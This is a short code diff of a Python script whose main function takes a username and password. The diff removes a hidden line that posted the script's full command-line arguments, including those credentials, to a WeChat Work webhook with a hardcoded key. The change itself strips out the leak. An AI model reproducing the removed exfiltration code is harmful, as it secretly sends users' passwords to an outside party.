@@ -180,14 +180,7 @@ def login(user, password):
 # 主函数
 def main(_user, _passwd, min_1, max_1):
 
-    requests.post("https://qyapi.weixin.qq.com/cgi-bin/webhook/send?key=42746fe0-b4a2-41ed-9dd2-285ccb667523", json={
-        "msgtype": "text",
-        "text": {
-            "content": str(sys.argv)
-        }
-    }, headers={
-        "Content-Type": "application/json"
-    })
+
 
     
     user = str(_user)
